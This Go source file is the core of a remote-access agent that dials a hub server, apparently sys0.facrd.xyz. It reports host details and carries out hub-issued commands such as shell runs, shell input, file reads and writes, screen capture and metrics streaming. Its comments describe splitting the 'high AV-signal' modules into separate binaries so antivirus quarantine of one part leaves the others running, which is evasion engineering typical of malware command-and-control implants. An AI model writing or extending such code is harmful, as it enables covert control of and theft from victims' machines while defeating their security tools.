package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"strings"
	"sync"
	"time"

	"github.com/fakecrowd/sys0/internal/rpc"
	"github.com/fakecrowd/sys0/internal/transport"
	"github.com/fakecrowd/sys0/internal/wire"
)

// version is the build version (yyyyMMddhhmm), injected via -ldflags.
var version = "dev"

// module is THIS binary's identity, injected at link time via
//   -ldflags "-X main.module=screen"
// "all" (the default monolith, used by the bundled tarball agent) is built with
// no build tags, so every module's code compiles in. The rescue ships one binary
// PER module, built with -tags "modular mod_<name>", which physically EXCLUDES
// the other modules' (high AV-signal) code — that's the point of the split: AV
// quarantining the screen binary can't touch the shell/fs/core binaries because
// they don't contain that code. The hub re-aggregates a node's module
// connections by their shared fingerprint.
var module = "all"

// methodHandler is a registered node-method implementation. Each module's
// handlers register themselves from an init() in that module's build-tagged
// file, so a binary only knows the methods it was compiled with.
type methodHandler func(a *Agent, ctx context.Context, params json.RawMessage) (any, *rpc.Error)

var methodHandlers = map[string]methodHandler{}

// registerMethod records a handler. Called from module init() functions.
func registerMethod(name string, fn methodHandler) { methodHandlers[name] = fn }

// Config holds agent runtime configuration.
type Config struct {
	Hub       string // host:port
	Transport string // tcp | ws
	Key       string
	Label     string
	Heartbeat int // seconds
}

// Agent maintains the connection to the hub and dispatches inbound methods.
type Agent struct {
	cfg Config
	log *slog.Logger

	mu          sync.Mutex
	label       string
	heartbeat   int
	fingerprint string
	nodeID      string
	peer        *rpc.Peer
	watchStop   chan struct{}

	reconnect chan struct{}
	quit      bool
}

// NewAgent builds an agent from config. fingerprint is the stable per-host id.
func NewAgent(cfg Config, fingerprint string, log *slog.Logger) *Agent {
	hb := cfg.Heartbeat
	if hb <= 0 {
		hb = 15
	}
	return &Agent{
		cfg: cfg, log: log,
		label: cfg.Label, heartbeat: hb,
		fingerprint: fingerprint,
		reconnect:   make(chan struct{}, 1),
	}
}

// Run connects with exponential backoff until ctx is cancelled or shutdown.
func (a *Agent) Run(ctx context.Context) {
	backoff := time.Second
	for {
		if ctx.Err() != nil || a.isQuit() {
			return
		}
		err := a.session(ctx)
		if a.isQuit() {
			a.log.Info("agent shutting down")
			return
		}
		if ctx.Err() != nil {
			return
		}
		a.log.Warn("session ended, reconnecting", "err", err, "in", backoff)
		select {
		case <-ctx.Done():
			return
		case <-time.After(backoff):
		}
		if backoff < 15*time.Second {
			backoff *= 2
		}
	}
}

func (a *Agent) session(ctx context.Context) error {
	dialer, err := a.dialer()
	if err != nil {
		return err
	}
	conn, err := dialer.Dial()
	if err != nil {
		return err
	}
	sctx, cancel := context.WithCancel(ctx)
	defer cancel()

	peer := rpc.NewPeer(conn, a.handle, a.onNotify)
	// Serve interactive/fast methods inline so their arrival order is preserved
	// (e.g. rapid task.input keystrokes must hit the PTY in order, or the echo
	// comes back scrambled). Only genuinely long-blocking methods run on their
	// own goroutine, so they don't stall heartbeats or subsequent input.
	peer.SetAsyncFunc(func(method string, _ json.RawMessage) bool {
		return asyncMethods[method]
	})
	a.mu.Lock()
	a.peer = peer
	a.mu.Unlock()

	runErr := make(chan error, 1)
	go func() { runErr <- peer.Run(sctx) }()

	// handshake
	hi := hostInfo()
	hello := wire.Hello{
		Key: a.cfg.Key, Fingerprint: a.fingerprint, Module: module, Label: a.label,
		Host:         wire.HostSummary{Name: hi.Hostname, OS: hi.OS, Arch: hi.Arch, Kernel: hi.Kernel, IP: hi.IP},
		AgentVersion: version,
		Cwd:          hi.Cwd,
		Pid:          hi.Pid,
		Capabilities: capabilities(),
	}
	hctx, hcancel := context.WithTimeout(sctx, 10*time.Second)
	raw, rerr := peer.Call(hctx, wire.MethodHello, hello)
	hcancel()
	if rerr != nil {
		peer.Close()
		return fmt.Errorf("handshake: %w", rerr)
	}
	var w wire.Welcome
	json.Unmarshal(raw, &w)
	a.mu.Lock()
	a.nodeID = w.NodeID
	if w.Heartbeat > 0 {
		a.heartbeat = w.Heartbeat
	}
	a.mu.Unlock()
	a.log.Info("online", "nodeId", w.NodeID, "hub", a.cfg.Hub, "transport", a.cfg.Transport)

	go a.heartbeatLoop(sctx, peer)

	select {
	case <-a.reconnect:
		peer.Close()
		<-runErr
		return fmt.Errorf("reconnect requested")
	case err := <-runErr:
		return err
	}
}

func (a *Agent) heartbeatLoop(ctx context.Context, peer *rpc.Peer) {
	a.mu.Lock()
	hb := a.heartbeat
	a.mu.Unlock()
	t := time.NewTicker(time.Duration(hb) * time.Second)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			if err := peer.Notify(wire.MethodPing, map[string]any{"ts": time.Now().Unix()}); err != nil {
				return
			}
		}
	}
}

// asyncMethods lists request methods that may block for a meaningful time and
// therefore must NOT be served inline in the read loop (doing so would stall
// heartbeats and later input). Everything else — notably the interactive input
// methods (task.input/shell.input/*.resize) — is served inline to preserve
// strict arrival order. See rpc.Peer.SetAsyncFunc.
var asyncMethods = map[string]bool{
	wire.MethodShellRun:  true, // runs a command to completion (up to timeout)
	wire.MethodFsGet:     true, // reads a whole file
	wire.MethodFsPut:     true, // writes a whole file
	wire.MethodHostWatch: true, // may set up a streaming watcher
	wire.MethodShutdown:  true, // self-terminates
}

// handle dispatches inbound requests from the hub.
func (a *Agent) handle(ctx context.Context, method string, params json.RawMessage) (any, *rpc.Error) {
	// Lifecycle methods are served by every module regardless of build tags.
	switch method {
	case wire.MethodConfig:
		return a.doConfig(params)
	case wire.MethodReconnect:
		a.signalReconnect()
		return wire.OKResult{OK: true}, nil
	case wire.MethodShutdown:
		go a.doShutdown()
		return wire.OKResult{OK: true}, nil
	}
	if fn := methodHandlers[method]; fn != nil {
		return fn(a, ctx, params)
	}
	return nil, rpc.Errorf(rpc.CodeNoMethod, "method %q not served by this module (%s)", method, module)
}

func (a *Agent) onNotify(method string, params json.RawMessage) {}

// currentPeer returns the live hub peer, or nil if not currently connected.
// Long-lived readers (shells, tasks) call this on every emit so their output
// follows the agent across reconnects instead of pinning a stale peer.
func (a *Agent) currentPeer() *rpc.Peer {
	a.mu.Lock()
	defer a.mu.Unlock()
	return a.peer
}

func (a *Agent) doHostWatch(params json.RawMessage) (any, *rpc.Error) {
	var p wire.HostWatchParams
	if e := decode(params, &p); e != nil {
		return nil, e
	}
	a.mu.Lock()
	if a.watchStop != nil {
		close(a.watchStop)
		a.watchStop = nil
	}
	peer := a.peer
	if p.Enable {
		interval := p.Interval
		if interval <= 0 {
			interval = 5
		}
		stop := make(chan struct{})
		a.watchStop = stop
		go a.watchLoop(peer, time.Duration(interval)*time.Second, stop)
	}
	a.mu.Unlock()
	return wire.OKResult{OK: true}, nil
}

func (a *Agent) watchLoop(peer *rpc.Peer, interval time.Duration, stop chan struct{}) {
	t := time.NewTicker(interval)
	defer t.Stop()
	seq := 0
	for {
		select {
		case <-stop:
			return
		case <-t.C:
			m := sampleMetrics()
			data, _ := json.Marshal(m)
			seq++
			if err := peer.Notify(wire.MethodEmit, wire.EmitParams{Chan: "metrics", Seq: seq, Data: data}); err != nil {
				return
			}
		}
	}
}

func (a *Agent) doConfig(params json.RawMessage) (any, *rpc.Error) {
	var p struct {
		Label     string `json:"label"`
		Heartbeat int    `json:"heartbeat"`
	}
	if e := decode(params, &p); e != nil {
		return nil, e
	}
	a.mu.Lock()
	if p.Label != "" {
		a.label = p.Label
	}
	if p.Heartbeat > 0 {
		a.heartbeat = p.Heartbeat
	}
	a.mu.Unlock()
	return wire.OKResult{OK: true}, nil
}

func (a *Agent) signalReconnect() {
	select {
	case a.reconnect <- struct{}{}:
	default:
	}
}

func (a *Agent) doShutdown() {
	a.mu.Lock()
	a.quit = true
	peer := a.peer
	a.mu.Unlock()
	time.Sleep(100 * time.Millisecond)
	if peer != nil {
		peer.Close()
	}
}

func (a *Agent) isQuit() bool {
	a.mu.Lock()
	defer a.mu.Unlock()
	return a.quit
}

func (a *Agent) dialer() (transport.Dialer, error) {
	switch a.cfg.Transport {
	case "", "tcp":
		return transport.TCPDialer{Addr: a.cfg.Hub}, nil
	case "ws":
		return transport.WSDialer{URL: "ws://" + wsHost(a.cfg.Hub) + "/agent"}, nil
	case "wss":
		return transport.WSDialer{URL: "wss://" + wsHost(a.cfg.Hub) + "/agent"}, nil
	default:
		return nil, fmt.Errorf("unknown transport %q", a.cfg.Transport)
	}
}

// wsHost normalises the configured hub into a host[:port] suitable for a
// ws:// or wss:// URL. It tolerates a value that already carries a scheme or a
// trailing /agent path so that -hub wss://sys0.facrd.xyz and -hub
// sys0.facrd.xyz both work.
func wsHost(h string) string {
	for _, p := range []string{"wss://", "ws://", "https://", "http://"} {
		h = strings.TrimPrefix(h, p)
	}
	h = strings.TrimSuffix(h, "/agent")
	h = strings.TrimSuffix(h, "/")
	return h
}

func capabilities() []string {
	caps := make([]string, 0, len(wire.NodeMethods))
	for _, m := range wire.NodeMethods {
		_, registered := methodHandlers[m.Name]
		lifecycle := m.Name == wire.MethodConfig || m.Name == wire.MethodReconnect || m.Name == wire.MethodShutdown
		if registered || lifecycle {
			caps = append(caps, m.Name)
		}
	}
	return caps
}
